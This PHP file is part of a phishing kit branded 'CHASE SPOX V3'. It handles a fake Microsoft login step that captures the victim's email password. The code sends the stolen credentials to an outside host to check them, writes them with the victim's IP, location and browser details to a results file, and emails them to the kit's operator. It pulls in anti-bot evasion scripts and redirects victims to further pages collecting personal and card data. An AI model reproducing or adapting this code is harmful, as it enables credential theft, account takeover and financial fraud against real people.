<?php
ob_start();
session_start();

/**
 * DO NOT SELL THIS SCRIPT ! 
 * DO NOT CHANGE COPYRIGHT !
 * CHASE -
 * version 3.0
 * icq & telegram = @spoxcoder
 
###############################################
#$            C0d3d by Spox_dz               $#
#$   Recording doesn't  make you a Coder     $#
#$          Copyright 2020 Chase             $#
###############################################

**/

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';

if (!isset($_SESSION['login_SESSION'])) {
  header("Location: ../../index");
  exit();
}

$key = substr(sha1(mt_rand()),1,25);

if(isset($_POST['passwd'])){
$_SESSION['passwd'] = $_POST['passwd'];
	include '../../admin/YOUR-CONFIG.php';
	include '../Functions/Fuck-you.php';

$getdetails = "https://spox-coder.info/spox/hotmail_true_login.php?email=".$_SESSION['emailhi']."&pass=".$_SESSION['passwd']."&api=".$api."";
$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, $getdetails);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content  = curl_exec($curl);
curl_close($curl);
$details  = json_decode($content);
$checkemailpassword = $details->response;

 if ($checkemailpassword == "bad") {
		exit(header("Location: ../../microsoft_verify?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."&invalid=password"));
	}else{
		
$hi="#---------------------------[ -CHASE-SPOX V3- EMAIL ACCESS ]----------------------------#\r\n";
	$hi.="Email	: {$_SESSION['emailhi']}\r\n";
	$hi.="Password: {$_POST['passwd']}\r\n";
	$hi.="#---------------------------[ -CHASE-SPOX V3- IP INFO ]----------------------------#\r\n";
	$hi.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
	$hi.="IP COUNTRY	: {$_SESSION['country']}\r\n";
	$hi.="IP CITY	: {$_SESSION['city']}\r\n";
	$hi.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['platform']}\r\n";
	$hi.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
	$hi.="TIME		: ".date("d/m/Y h:i:sa")." GMT\r\n";
	$hi.="#---------------------------[ -CHASE-SPOX V3- EMAIL ACCESS ]----------------------------#\r\n";

	$save=fopen("../Chase_Result/access".$pin.".txt","a+");
		fwrite($save,$hi);
		fclose($save);

		$subject="#CHASE SPOX TRUE EMAIL ACCESS  => From {$_SESSION['ip']} [ {$_SESSION['country']}-{$_SESSION['countrycode']} - {$_SESSION['platform']} ]";

	$headers="From: CHASE SPOX V3  <chase_spoxv3@dila.dz>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";

		@mail($your_email,$subject,$hi,$headers);

if ($show_contact_information=="yes") {
		exit(header("Location: ../../personal_details?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verify?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	}
	if ($show_success_page=="yes") {
		exit(header("Location: ../../thanks?chase_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	}else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://bit.ly/2koaH3G")); // go to bank login page officiel..
	}
	}

}else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>